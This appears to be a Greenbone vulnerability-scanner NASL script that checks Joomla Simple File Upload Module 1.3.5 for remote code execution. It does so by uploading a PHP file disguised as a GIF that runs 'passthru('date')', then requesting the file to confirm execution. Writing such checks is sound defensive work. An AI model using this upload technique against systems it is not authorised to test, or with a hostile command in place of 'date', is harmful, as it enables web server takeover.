CPE = "cpe:/a:joomla:joomla";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802560" );
	script_version( "2019-07-26T13:41:14+0000" );
	script_bugtraq_id( 51214 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2019-07-26 13:41:14 +0000 (Fri, 26 Jul 2019)" );
	script_tag( name: "creation_date", value: "2012-01-06 20:03:12 +0530 (Fri, 06 Jan 2012)" );
	script_name( "Joomla Simple File Upload Module Remote Code Execution Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "joomla_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "joomla/installed" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/47370/" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18287/" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to upload PHP scripts
  and execute arbitrary commands on a web server." );
	script_tag( name: "affected", value: "Joomla Simple File Upload Module version 1.3.5" );
	script_tag( name: "insight", value: "The flaw is due to the access and input validation errors in the
  'index.php' script when uploading files." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Joomla Simple File Upload Module and is
  prone to remote code execution vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!joomlaPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!joomlaDir = get_app_location( cpe: CPE, port: joomlaPort )){
	exit( 0 );
}
if(joomlaDir == "/"){
	joomlaDir = "";
}
req = http_get( item: NASLString( joomlaDir, "/index.php" ), port: joomlaPort );
buf = http_keepalive_send_recv( port: joomlaPort, data: req, bodyonly: FALSE );
ver = eregmatch( pattern: "\" name=\"sfuFormFields([0-9]+)", string: buf );
if(ver[1] == NULL){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: joomlaPort );
content = NASLString( "-----------------------------1933563624\\r\\n", "Content-Disposition: form-data; name='sfuFormFields", ver[1], "'\\r\\n", "\\r\\n", "\\r\\n", "-----------------------------1933563624\\r\\n", "Content-Disposition: form-data; name='uploadedfile", ver[1], "[]'; filename='ttst_img00117799.php5'\\r\\n", "Content-Type: image/gif\\r\\n", "\\r\\n", "GIF8/*/*<?php passthru('date')?>/*\\n", "\\r\\n", "-----------------------------1933563624--\\r\\n" );
header = NASLString( "POST " + joomlaDir + "/index.php HTTP/1.1\\r\\n", "Host: " + host + "\\r\\n", "User-Agent: " + useragent + "\\r\\n", "Connection: Close\\r\\n", "Content-Type: multipart/form-data; boundary=---------------------------1933563624\\r\\n", "Content-Length: " + strlen( content ) + "\\r\\n\\r\\n" );
sndReq2 = header + content;
rcvRes2 = http_keepalive_send_recv( port: joomlaPort, data: sndReq2 );
sndReq = http_get( item: joomlaDir + "/images/ttst_img00117799.php5", port: joomlaPort );
rcvRes = http_keepalive_send_recv( port: joomlaPort, data: sndReq );
if(!isnull( rcvRes )){
	if(ContainsString( rcvRes, "^HTTP/1\\.[01] 200" ) && eregmatch( pattern: "IST [0-9]+", string: rcvRes )){
		security_message( port: joomlaPort );
	}
}

